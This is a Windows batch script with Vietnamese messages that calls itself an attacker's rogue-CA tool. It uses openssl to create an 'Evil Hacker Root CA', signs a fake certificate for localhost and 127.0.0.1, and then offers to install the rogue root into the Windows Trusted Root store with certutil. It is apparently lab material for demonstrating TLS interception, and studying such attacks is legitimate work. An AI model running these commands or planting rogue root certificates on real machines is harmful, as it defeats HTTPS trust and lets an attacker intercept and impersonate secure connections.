@echo off
setlocal
set MSYS_NO_PATHCONV=1
cd /d "%~dp0"

echo =======================================================
echo    TAO CHUNG CHI GIA MAO (ROGUE CA) - ATTACKER
echo =======================================================
echo.

echo [1/4] Tao Root CA gia mao (evilCA)...
openssl genrsa -out evilCA.key 2048
openssl req -x509 -new -nodes -key evilCA.key -sha256 -days 3650 -subj "/C=VN/ST=HoChiMinh/O=Evil Hacker Corp/CN=Evil Hacker Root CA" -out evilCA.crt

echo [2/4] Tao khoa rieng va CSR cho server gia mao...
openssl genrsa -out fake_localhost.key 2048
openssl req -new -key fake_localhost.key -subj "/C=VN/ST=HoChiMinh/O=Evil Hacker Corp/CN=localhost" -out fake_localhost.csr

echo [3/4] Tao file cau hinh extension va ky fake_localhost.crt...
echo authorityKeyIdentifier=keyid,issuer > fake_localhost.ext
echo basicConstraints=CA:FALSE >> fake_localhost.ext
echo keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment >> fake_localhost.ext
echo extendedKeyUsage = serverAuth >> fake_localhost.ext
echo subjectAltName = @alt_names >> fake_localhost.ext
echo [alt_names] >> fake_localhost.ext
echo DNS.1 = localhost >> fake_localhost.ext
echo IP.1 = 127.0.0.1 >> fake_localhost.ext

openssl x509 -req -in fake_localhost.csr -CA evilCA.crt -CAkey evilCA.key -CAcreateserial -out fake_localhost.crt -days 365 -sha256 -extfile fake_localhost.ext

echo [4/4] Kiem tra chuoi xac thuc chung chi...
openssl verify -CAfile evilCA.crt fake_localhost.crt

echo.
echo =======================================================
echo      DA TAO XONG CHUNG CHI GIA MAO THANH CONG!
echo =======================================================
echo.
echo Ban co muon cai dat evilCA.crt vao Windows Trusted Root Store luon khong?
set /p CHOICE="Nhap Y de cai dat, hoac Enter de bo qua: "

if /i "%CHOICE%"=="Y" (
    echo Dang cai dat evilCA.crt...
    certutil -user -addstore -f "Root" evilCA.crt
    echo [XONG] Da cai dat xong evilCA.crt.
    echo Hay mo Chrome go 'chrome://restart' de cap nhat.
)

pause
